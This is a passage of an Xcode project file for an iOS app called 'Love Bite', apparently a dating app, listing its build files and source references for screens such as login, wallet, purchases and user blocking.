// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		392282EE2E6038EB0029B524 /* MenuVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 392282EC2E6038EB0029B524 /* MenuVC.swift */; };
		392282EF2E6038EB0029B524 /* MenuVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 392282ED2E6038EB0029B524 /* MenuVC.xib */; };
		392E210F2E6019B1009AE7C6 /* CashOutVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 392E210D2E6019B1009AE7C6 /* CashOutVC.swift */; };
		392E21102E6019B1009AE7C6 /* CashOutVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 392E210E2E6019B1009AE7C6 /* CashOutVC.xib */; };
		392E21172E601B6F009AE7C6 /* PurchaseVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 392E21152E601B6F009AE7C6 /* PurchaseVC.swift */; };
		392E21182E601B6F009AE7C6 /* PurchaseVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 392E21162E601B6F009AE7C6 /* PurchaseVC.xib */; };
		392E211F2E601C9F009AE7C6 /* PurchaseCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 392E211D2E601C9F009AE7C6 /* PurchaseCVCell.swift */; };
		392E21202E601C9F009AE7C6 /* PurchaseCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 392E211E2E601C9F009AE7C6 /* PurchaseCVCell.xib */; };
		392E21272E6026CC009AE7C6 /* ProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 392E21252E6026CC009AE7C6 /* ProfileVC.swift */; };
		392E21282E6026CC009AE7C6 /* ProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 392E21262E6026CC009AE7C6 /* ProfileVC.xib */; };
		393349732E604ACD00DF927A /* LoveUserVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393349712E604ACD00DF927A /* LoveUserVC.swift */; };
		393349742E604ACD00DF927A /* LoveUserVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 393349722E604ACD00DF927A /* LoveUserVC.xib */; };
		3933497B2E604B7900DF927A /* LoveUserListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393349792E604B7900DF927A /* LoveUserListTVCell.swift */; };
		3933497C2E604B7900DF927A /* LoveUserListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3933497A2E604B7900DF927A /* LoveUserListTVCell.xib */; };
		393F5A6A2E5C7F75009643D0 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393F5A662E5C7F75009643D0 /* HomeVC.swift */; };
		393F5A6B2E5C7F75009643D0 /* UserListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393F5A632E5C7F75009643D0 /* UserListCVCell.swift */; };
		393F5A6C2E5C7F75009643D0 /* UserListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 393F5A642E5C7F75009643D0 /* UserListCVCell.xib */; };
		393F5A6D2E5C7F75009643D0 /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 393F5A672E5C7F75009643D0 /* HomeVC.xib */; };
		39500DCA2E5D686F00D4E500 /* PostListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39500DC92E5D686F00D4E500 /* PostListTVCell.xib */; };
		39500DCB2E5D686F00D4E500 /* PostListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39500DC82E5D686F00D4E500 /* PostListTVCell.swift */; };
		39500DD22E5D927900D4E500 /* WalletVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39500DD02E5D927900D4E500 /* WalletVC.swift */; };
		39500DD32E5D927900D4E500 /* WalletVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39500DD12E5D927900D4E500 /* WalletVC.xib */; };
		398E4FAA2E5D98C8000EB3EA /* TransactionHistoryVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */; };
		398E4FAB2E5D98C8000EB3EA /* TransactionHistoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */; };
		398E4FB22E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */; };
		398E4FB32E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */; };
		399A3F852E6050630008D68D /* BlockUserVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 399A3F832E6050630008D68D /* BlockUserVC.swift */; };
		399A3F862E6050630008D68D /* BlockUserVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 399A3F842E6050630008D68D /* BlockUserVC.xib */; };
		39A22AFA2E5ECCB70041F60E /* TransactionHistoryHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */; };
		39A22AFC2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */; };
		39AD9A4F2E5C8FCF0034B1B9 /* GalleryListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39AD9A4E2E5C8FCF0034B1B9 /* GalleryListCVCell.xib */; };
		39AD9A502E5C8FCF0034B1B9 /* GalleryListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39AD9A4D2E5C8FCF0034B1B9 /* GalleryListCVCell.swift */; };
		39B2444B2E5C825400B0138F /* Active24HVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B244492E5C825400B0138F /* Active24HVC.swift */; };
		39B2444C2E5C825400B0138F /* Active24HVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B2444A2E5C825400B0138F /* Active24HVC.xib */; };
		39B2444E2E5C82BB00B0138F /* UIViewController+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B2444D2E5C82BB00B0138F /* UIViewController+Extension.swift */; };
		39B244552E5C849D00B0138F /* FavoritesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B244532E5C849D00B0138F /* FavoritesVC.swift */; };
		39B244562E5C849D00B0138F /* FavoritesVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B244542E5C849D00B0138F /* FavoritesVC.xib */; };
		39B2445B2E5C884300B0138F /* ProfileDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B244592E5C884300B0138F /* ProfileDetailsVC.swift */; };
		39B2445C2E5C884300B0138F /* ProfileDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B2445A2E5C884300B0138F /* ProfileDetailsVC.xib */; };
		88342F0A2E5EE65500859FC7 /* ShareafewdetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */; };
		88342F0B2E5EE65500859FC7 /* WhenisthebigdayVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */; };
		88342F0C2E5EE65500859FC7 /* ShareafewdetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */; };
		88342F0D2E5EE65500859FC7 /* WhenisthebigdayVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */; };
		88342F102E5EE75B00859FC7 /* CountryPickerView in Frameworks */ = {isa = PBXBuildFile; productRef = 88342F0F2E5EE75B00859FC7 /* CountryPickerView */; };
		88342F132E5EE76B00859FC7 /* DateTimePicker in Frameworks */ = {isa = PBXBuildFile; productRef = 88342F122E5EE76B00859FC7 /* DateTimePicker */; };
		887E235A2E5C44D00016E082 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23502E5C44D00016E082 /* AppDelegate.swift */; };
		887E235C2E5C44D00016E082 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23582E5C44D00016E082 /* ViewController.swift */; };
		887E235D2E5C44D00016E082 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 887E23512E5C44D00016E082 /* Assets.xcassets */; };
		887E235F2E5C44D00016E082 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 887E23542E5C44D00016E082 /* LaunchScreen.storyboard */; };
		887E23602E5C44D00016E082 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 887E23562E5C44D00016E082 /* Main.storyboard */; };
		887E23672E5C4F0A0016E082 /* LoginVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 887E23662E5C4F0A0016E082 /* LoginVC.xib */; };
		887E23682E5C4F0A0016E082 /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23652E5C4F0A0016E082 /* LoginVC.swift */; };
		887E23852E5C53EF0016E082 /* Duration.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E237B2E5C53EF0016E082 /* Duration.swift */; };
		887E23862E5C53EF0016E082 /* AppUtilites.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23812E5C53EF0016E082 /* AppUtilites.swift */; };
		887E23872E5C53EF0016E082 /* String+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E237A2E5C53EF0016E082 /* String+Timepiece.swift */; };
		887E23882E5C53EF0016E082 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23832E5C53EF0016E082 /* AppConstants.swift */; };
		887E23892E5C53EF0016E082 /* WWCalendarTimeSelector.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23782E5C53EF0016E082 /* WWCalendarTimeSelector.swift */; };
		887E238B2E5C53EF0016E082 /* VideoPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E237F2E5C53EF0016E082 /* VideoPicker.swift */; };
		887E238C2E5C53EF0016E082 /* ImagePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E237D2E5C53EF0016E082 /* ImagePicker.swift */; };
		887E238D2E5C53EF0016E082 /* NSDate+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23792E5C53EF0016E082 /* NSDate+Timepiece.swift */; };
		887E238E2E5C53EF0016E082 /* NSDateComponents+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23742E5C53EF0016E082 /* NSDateComponents+Timepiece.swift */; };
		887E238F2E5C53EF0016E082 /* Extentions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23732E5C53EF0016E082 /* Extentions.swift */; };
		887E23902E5C53EF0016E082 /* NSCalendar+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23752E5C53EF0016E082 /* NSCalendar+Timepiece.swift */; };
		887E23912E5C53EF0016E082 /* PickerViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E237E2E5C53EF0016E082 /* PickerViewViewController.swift */; };
		887E23922E5C53EF0016E082 /* AGDesignable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23822E5C53EF0016E082 /* AGDesignable.swift */; };
		887E23932E5C53EF0016E082 /* Int+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23762E5C53EF0016E082 /* Int+Timepiece.swift */; };
		887E23942E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 887E23772E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard */; };
		887E23A62E5C55970016E082 /* String+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23A42E5C55970016E082 /* String+Extension.swift */; };
		887E23A72E5C55970016E082 /* UIView+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23A02E5C55970016E082 /* UIView+Extension.swift */; };
		887E23A82E5C55970016E082 /* UIColor+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23A12E5C55970016E082 /* UIColor+Extention.swift */; };
		887E23A92E5C55970016E082 /* UIFont+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23A22E5C55970016E082 /* UIFont+Extension.swift */; };
		887E23AA2E5C55970016E082 /* UIImageView+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23A32E5C55970016E082 /* UIImageView+Extension.swift */; };
		887E23AF2E5C647C0016E082 /* ForgotPasswordVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 887E23AE2E5C647C0016E082 /* ForgotPasswordVC.xib */; };
		887E23B02E5C647C0016E082 /* ForgotPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23AD2E5C647C0016E082 /* ForgotPasswordVC.swift */; };
		888C2CD52E5C6DD20047C8E5 /* RegisterVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 888C2CD42E5C6DD20047C8E5 /* RegisterVC.xib */; };
		888C2CD62E5C6DD20047C8E5 /* RegisterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888C2CD32E5C6DD20047C8E5 /* RegisterVC.swift */; };
		88981FF72E5C949400C33CAB /* UploadPhotoVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88981FF32E5C949400C33CAB /* UploadPhotoVC.swift */; };
		88981FF82E5C949400C33CAB /* TelluswhoyouareVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88981FEF2E5C949400C33CAB /* TelluswhoyouareVC.swift */; };
		88981FF92E5C949400C33CAB /* UploadPhotoVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88981FF42E5C949400C33CAB /* UploadPhotoVC.xib */; };
		88981FFA2E5C949400C33CAB /* TelluswhoyouareVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88981FF02E5C949400C33CAB /* TelluswhoyouareVC.xib */; };
		FBC0B84882AFCF93E1F7B9D6 /* Pods_Love_Bite.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Love_Bite.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Love Bite.release.xcconfig"; path = "Target Support Files/Pods-Love Bite/Pods-Love Bite.release.xcconfig"; sourceTree = "<group>"; };
		392282EC2E6038EB0029B524 /* MenuVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuVC.swift; sourceTree = "<group>"; };
		392282ED2E6038EB0029B524 /* MenuVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MenuVC.xib; sourceTree = "<group>"; };
		392E210D2E6019B1009AE7C6 /* CashOutVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CashOutVC.swift; sourceTree = "<group>"; };
		392E210E2E6019B1009AE7C6 /* CashOutVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CashOutVC.xib; sourceTree = "<group>"; };
		392E21152E601B6F009AE7C6 /* PurchaseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PurchaseVC.swift; sourceTree = "<group>"; };
		392E21162E601B6F009AE7C6 /* PurchaseVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PurchaseVC.xib; sourceTree = "<group>"; };
		392E211D2E601C9F009AE7C6 /* PurchaseCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PurchaseCVCell.swift; sourceTree = "<group>"; };
		392E211E2E601C9F009AE7C6 /* PurchaseCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PurchaseCVCell.xib; sourceTree = "<group>"; };
		392E21252E6026CC009AE7C6 /* ProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileVC.swift; sourceTree = "<group>"; };
		392E21262E6026CC009AE7C6 /* ProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileVC.xib; sourceTree = "<group>"; };
		393349712E604ACD00DF927A /* LoveUserVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoveUserVC.swift; sourceTree = "<group>"; };
		393349722E604ACD00DF927A /* LoveUserVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoveUserVC.xib; sourceTree = "<group>"; };
		393349792E604B7900DF927A /* LoveUserListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoveUserListTVCell.swift; sourceTree = "<group>"; };
		3933497A2E604B7900DF927A /* LoveUserListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoveUserListTVCell.xib; sourceTree = "<group>"; };
		393F5A632E5C7F75009643D0 /* UserListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserListCVCell.swift; sourceTree = "<group>"; };
		393F5A642E5C7F75009643D0 /* UserListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UserListCVCell.xib; sourceTree = "<group>"; };
		393F5A662E5C7F75009643D0 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
		393F5A672E5C7F75009643D0 /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
		39500DC82E5D686F00D4E500 /* PostListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostListTVCell.swift; sourceTree = "<group>"; };
		39500DC92E5D686F00D4E500 /* PostListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PostListTVCell.xib; sourceTree = "<group>"; };
		39500DD02E5D927900D4E500 /* WalletVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletVC.swift; sourceTree = "<group>"; };
		39500DD12E5D927900D4E500 /* WalletVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletVC.xib; sourceTree = "<group>"; };
		398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryVC.swift; sourceTree = "<group>"; };
		398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryVC.xib; sourceTree = "<group>"; };
		398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryTVCell.swift; sourceTree = "<group>"; };
		398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryTVCell.xib; sourceTree = "<group>"; };
		399A3F832E6050630008D68D /* BlockUserVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlockUserVC.swift; sourceTree = "<group>"; };
		399A3F842E6050630008D68D /* BlockUserVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BlockUserVC.xib; sourceTree = "<group>"; };
		39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryHeaderView.swift; sourceTree = "<group>"; };
		39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryHeaderView.xib; sourceTree = "<group>"; };
		39AD9A4D2E5C8FCF0034B1B9 /* GalleryListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryListCVCell.swift; sourceTree = "<group>"; };
		39AD9A4E2E5C8FCF0034B1B9 /* GalleryListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GalleryListCVCell.xib; sourceTree = "<group>"; };
		39B244492E5C825400B0138F /* Active24HVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Active24HVC.swift; sourceTree = "<group>"; };
		39B2444A2E5C825400B0138F /* Active24HVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Active24HVC.xib; sourceTree = "<group>"; };
		39B2444D2E5C82BB00B0138F /* UIViewController+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extension.swift"; sourceTree = "<group>"; };
		39B244532E5C849D00B0138F /* FavoritesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoritesVC.swift; sourceTree = "<group>"; };
		39B244542E5C849D00B0138F /* FavoritesVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FavoritesVC.xib; sourceTree = "<group>"; };
		39B244592E5C884300B0138F /* ProfileDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileDetailsVC.swift; sourceTree = "<group>"; };
		39B2445A2E5C884300B0138F /* ProfileDetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileDetailsVC.xib; sourceTree = "<group>"; };
		6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Love Bite.debug.xcconfig"; path = "Target Support Files/Pods-Love Bite/Pods-Love Bite.debug.xcconfig"; sourceTree = "<group>"; };
		88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShareafewdetailsVC.swift; sourceTree = "<group>"; };
		88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ShareafewdetailsVC.xib; sourceTree = "<group>"; };
		88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhenisthebigdayVC.swift; sourceTree = "<group>"; };
		88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WhenisthebigdayVC.xib; sourceTree = "<group>"; };
		887E23382E5C44C50016E082 /* Love Bite.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Love Bite.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		887E23502E5C44D00016E082 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		887E23512E5C44D00016E082 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		887E23522E5C44D00016E082 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		887E23532E5C44D00016E082 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		887E23552E5C44D00016E082 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		887E23582E5C44D00016E082 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		887E23652E5C4F0A0016E082 /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
		887E23662E5C4F0A0016E082 /* LoginVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoginVC.xib; sourceTree = "<group>"; };
		887E23732E5C53EF0016E082 /* Extentions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extentions.swift; sourceTree = "<group>"; };
		887E23742E5C53EF0016E082 /* NSDateComponents+Timepiece.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSDateComponents+Timepiece.swift"; sourceTree = "<group>"; };
		887E23752E5C53EF0016E082 /* NSCalendar+Timepiece.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSCalendar+Timepiece.swift"; sourceTree = "<group>"; };
		887E23762E5C53EF0016E082 /* Int+Timepiece.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Int+Timepiece.swift"; sourceTree = "<group>"; };
		887E23772E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = WWCalendarTimeSelector.storyboard; sourceTree = "<group>"; };
		887E23782E5C53EF0016E082 /* WWCalendarTimeSelector.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WWCalendarTimeSelector.swift; sourceTree = "<group>"; };
		887E23792E5C53EF0016E082 /* NSDate+Timepiece.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSDate+Timepiece.swift"; sourceTree = "<group>"; };
		887E237A2E5C53EF0016E082 /* String+Timepiece.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Timepiece.swift"; sourceTree = "<group>"; };
		887E237B2E5C53EF0016E082 /* Duration.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Duration.swift; sourceTree = "<group>"; };
		887E237D2E5C53EF0016E082 /* ImagePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePicker.swift; sourceTree = "<group>"; };
		887E237E2E5C53EF0016E082 /* PickerViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PickerViewViewController.swift; sourceTree = "<group>"; };
		887E237F2E5C53EF0016E082 /* VideoPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPicker.swift; sourceTree = "<group>"; };
		887E23812E5C53EF0016E082 /* AppUtilites.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppUtilites.swift; sourceTree = "<group>"; };
		887E23822E5C53EF0016E082 /* AGDesignable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AGDesignable.swift; sourceTree = "<group>"; };
		887E23832E5C53EF0016E082 /* AppConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
		887E23A02E5C55970016E082 /* UIView+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extension.swift"; sourceTree = "<group>"; };
		887E23A12E5C55970016E082 /* UIColor+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extention.swift"; sourceTree = "<group>"; };
		887E23A22E5C55970016E082 /* UIFont+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIFont+Extension.swift"; sourceTree = "<group>"; };
		887E23A32E5C55970016E082 /* UIImageView+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIImageView+Extension.swift"; sourceTree = "<group>"; };
		887E23A42E5C55970016E082 /* String+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Extension.swift"; sourceTree = "<group>"; };
		887E23AD2E5C647C0016E082 /* ForgotPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordVC.swift; sourceTree = "<group>"; };
		887E23AE2E5C647C0016E082 /* ForgotPasswordVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ForgotPasswordVC.xib; sourceTree = "<group>"; };
		888C2CD32E5C6DD20047C8E5 /* RegisterVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RegisterVC.swift; sourceTree = "<group>"; };
		888C2CD42E5C6DD20047C8E5 /* RegisterVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RegisterVC.xib; sourceTree = "<group>"; };
		88981FEF2E5C949400C33CAB /* TelluswhoyouareVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TelluswhoyouareVC.swift; sourceTree = "<group>"; };
		88981FF02E5C949400C33CAB /* TelluswhoyouareVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TelluswhoyouareVC.xib; sourceTree = "<group>"; };
		88981FF32E5C949400C33CAB /* UploadPhotoVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadPhotoVC.swift; sourceTree = "<group>"; };
		88981FF42E5C949400C33CAB /* UploadPhotoVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UploadPhotoVC.xib; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		887E23352E5C44C50016E082 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				88342F102E5EE75B00859FC7 /* CountryPickerView in Frameworks */,
				88342F132E5EE76B00859FC7 /* DateTimePicker in Frameworks */,
